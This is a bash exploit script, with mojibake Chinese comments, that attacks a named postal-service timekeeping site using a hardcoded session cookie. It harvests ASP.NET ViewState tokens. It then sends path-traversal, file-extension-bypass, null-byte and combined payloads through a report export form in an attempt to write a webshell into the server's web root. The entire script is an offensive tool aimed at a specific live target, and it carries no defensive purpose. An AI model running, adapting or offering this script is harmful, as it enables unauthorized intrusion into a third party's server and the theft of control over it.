#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "ğŸ”¥ğŸ”¥ğŸ”¥ åˆ©ç”¨Exportæ–‡ä»¶å†™å…¥æ¼æ´GetShell"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

mkdir -p file_write_exploit && cd file_write_exploit

# è·å–ViewState
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" -H "Cookie: $COOKIE")
VIEWSTATE=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VIEWGEN=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EVENTVAL=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

echo "[*] ViewStateè·å–å®Œæˆ"
echo ""

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo "ğŸ¯ æµ‹è¯•1: è·¯å¾„éå† - å°è¯•å†™å…¥Webæ ¹ç›®å½•"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

TRAVERSAL_PAYLOADS=(
    "../../../inetpub/wwwroot/chamcong/test"
    "../../chamcong/test"
    "../test"
    "..\\..\\..\\inetpub\\wwwroot\\chamcong\\test"
    "....//....//....//inetpub//wwwroot//chamcong//test"
)

for trav in "${TRAVERSAL_PAYLOADS[@]}"; do
    echo -n "  txtThang=$trav: "
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
        --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
        --data-urlencode "txtThang=${trav}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "trav_$(echo $trav | md5sum | cut -d' ' -f1).html" 2>&1
    
    filename="trav_$(echo $trav | md5sum | cut -d' ' -f1).html"
    
    # æ£€æŸ¥é”™è¯¯æ¶ˆæ¯
    if grep -qi "Could not find\|DirectoryNotFoundException" "$filename"; then
        echo "âŒ ç›®å½•ä¸å­˜åœ¨"
        # æå–å®Œæ•´è·¯å¾„
        path=$(grep -oE "C:\\[^'\"<>]+" "$filename" | head -1)
        echo "    å°è¯•çš„è·¯å¾„: $path"
    elif grep -qi "Access.*denied\|UnauthorizedAccessException" "$filename"; then
        echo "âš ï¸  æƒé™ä¸è¶³ï¼ˆä½†è·¯å¾„å¯èƒ½æœ‰æ•ˆï¼ï¼‰"
    elif grep -qi "successfully\|completed" "$filename"; then
        echo "ğŸ”¥ğŸ”¥ğŸ”¥ å¯èƒ½æˆåŠŸ!"
    else
        size=$(wc -c < "$filename")
        echo "? ($size bytes)"
    fi
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nğŸ¯ æµ‹è¯•2: æ–‡ä»¶æ‰©å±•åç»•è¿‡"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

EXTENSION_PAYLOADS=(
    "shell.aspx"
    "shell.aspx;.jpg"
    "11.aspx"
    "11.asp"
    "11.cer"
    "11.config"
)

for ext in "${EXTENSION_PAYLOADS[@]}"; do
    echo -n "  txtThang=$ext: "
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
        --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
        --data-urlencode "txtThang=${ext}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "ext_$(echo $ext | md5sum | cut -d' ' -f1).html" 2>&1
    
    filename="ext_$(echo $ext | md5sum | cut -d' ' -f1).html"
    
    if grep -qi "Could not find" "$filename"; then
        path=$(grep -oE "C:\\TEMP\\[^'\"<>]+" "$filename" | head -1)
        echo "ç”Ÿæˆè·¯å¾„: $path"
    else
        echo "? ($(wc -c < $filename) bytes)"
    fi
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nğŸ¯ æµ‹è¯•3: ç©ºå­—èŠ‚æ³¨å…¥"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

NULL_BYTE_PAYLOADS=(
    "11%00.aspx"
    "11%00"
    "shell%00.jpg"
)

for null in "${NULL_BYTE_PAYLOADS[@]}"; do
    echo -n "  txtThang=$null: "
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data "__VIEWSTATE=$(echo $VIEWSTATE | sed 's/ /%20/g')" \
        --data "__VIEWSTATEGENERATOR=$VIEWGEN" \
        --data "__EVENTVALIDATION=$(echo $EVENTVAL | sed 's/ /%20/g')" \
        --data "txtThang=${null}" \
        --data "txtNam=2025" \
        --data "btnExport=Export" \
        -o "null_$(echo $null | md5sum | cut -d' ' -f1).html" 2>&1
    
    echo "å®Œæˆ"
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nğŸ¯ æµ‹è¯•4: ç»„åˆæ”»å‡» - è·¯å¾„éå† + æ‰©å±•å"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

COMBO_PAYLOADS=(
    "../../../inetpub/wwwroot/chamcong/shell.aspx"
    "../../wwwroot/chamcong/test.aspx"
    "../chamcong/webshell.aspx"
)

for combo in "${COMBO_PAYLOADS[@]}"; do
    echo -n "  $combo: "
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
        --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
        --data-urlencode "txtThang=${combo}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "combo_$(echo $combo | md5sum | cut -d' ' -f1).html" 2>&1
    
    filename="combo_$(echo $combo | md5sum | cut -d' ' -f1).html"
    
    if grep -qi "Could not find" "$filename"; then
        path=$(grep -oE "C:\\[^'\"<>]+" "$filename" | head -1)
        echo "è·¯å¾„: $path"
    elif grep -qi "Access.*denied" "$filename"; then
        echo "ğŸ”¥ æƒé™é”™è¯¯ï¼ˆè·¯å¾„å¯èƒ½æ­£ç¡®ï¼ï¼‰"
    else
        echo "? ($(wc -c < $filename) bytes)"
    fi
done

echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ“Š æµ‹è¯•å®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "ğŸ” æ‰€æœ‰ç”Ÿæˆçš„è·¯å¾„:"
grep -h "C:\\\\" *.html 2>/dev/null | grep -oE "C:\\\\[^'\"<>]+" | sort -u
